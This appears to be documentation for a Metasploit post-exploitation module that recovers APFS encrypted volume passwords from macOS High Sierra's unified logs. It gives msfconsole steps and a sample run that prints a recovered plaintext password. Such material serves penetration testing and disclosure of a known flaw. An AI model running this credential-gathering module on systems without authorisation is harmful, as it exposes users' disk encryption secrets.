This module uses a vulnerability in macOS High Sierra's `log` command. It uses the logs of the Disk Utility app to recover the password of an APFS encrypted volume from when it was created. 

## Vulnerable Application

  * macOS 10.13.0
  * macOS 10.13.1
  * macOS 10.13.2
  * macOS 10.13.3*


  \* On macOS 10.13.3, the password can only be recovered if the drive was encrypted before the system upgrade to 10.13.3. See [here](https://www.mac4n6.com/blog/2018/3/21/uh-oh-unified-logs-in-high-sierra-1013-show-plaintext-password-for-apfs-encrypted-external-volumes-via-disk-utilityapp) for more info

## Verification Steps

  Example steps in this format (is also in the PR):

  1. Start `msfconsole`
  2. Do: `use post/osx/gather/apfs_encrypted_volume_passwd`
  3. Do: set the `MOUNT_PATH` option if needed
  4. Do: ```run```
  5. You should get the password

## Options

  **MOUNT_PATH**

  `MOUNT_PATH` is the path on the macOS system where the encrypted drive is (or was) mounted. This is *not* the path under `/Volumes`

## Scenarios

  Typical run against an OSX session, after creating a new APFS disk using Disk Utility:

```
msf5 exploit(multi/handler) > use post/osx/gather/apfs_encrypted_volume_passwd
msf5 post(osx/gather/apfs_encrypted_volume_passwd) > set SESSION -1
SESSION => -1
msf5 post(osx/gather/apfs_encrypted_volume_passwd) > exploit

[+] APFS command found: newfs_apfs -i -E -S aa -v Untitled disk2s2 .
[+] APFS command found: newfs_apfs -A -e -E -S secretpassword -v Untitled disk2 .
[*] Post module execution completed
msf5 post(osx/gather/apfs_encrypted_volume_passwd) >
```
